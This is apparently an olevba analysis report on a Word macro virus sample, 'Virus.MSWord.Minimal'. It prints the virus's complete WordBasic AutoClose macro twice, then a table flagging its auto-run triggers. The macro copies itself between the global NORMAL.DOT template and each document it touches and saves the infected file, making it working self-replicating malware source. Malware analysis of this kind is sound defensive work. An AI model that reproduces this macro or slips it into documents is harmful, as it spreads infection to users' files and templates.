olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.ba-2558ca2b6d556c6c1dd6591d9d260582d3b2b7f1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.ba-2558ca2b6d556c6c1dd6591d9d260582d3b2b7f1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose1.bas 
in file: Virus.MSWord.Minimal.ba-2558ca2b6d556c6c1dd6591d9d260582d3b2b7f1 - OLE stream: 'Macros/VBA/AutoClose1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim M$
On Error GoTo -1: On Error GoTo MinSize
M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If M$ = "NORMAL.DOT" Then
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":aUtOOpen"

WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy WordBasic.[FileName$]() + ":aUtOOpen", "Global:AutoClose", 1
End If
MinSize:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Minimal.ba-2558ca2b6d556c6c1dd6591d9d260582d3b2b7f1 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim M$
On Error GoTo -1: On Error GoTo MinSize
M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If M$ = "NORMAL.DOT" Then
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":aUtOOpen"

WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy WordBasic.[FileName$]() + ":aUtOOpen", "Global:AutoClose", 1
End If
MinSize:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUtOOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

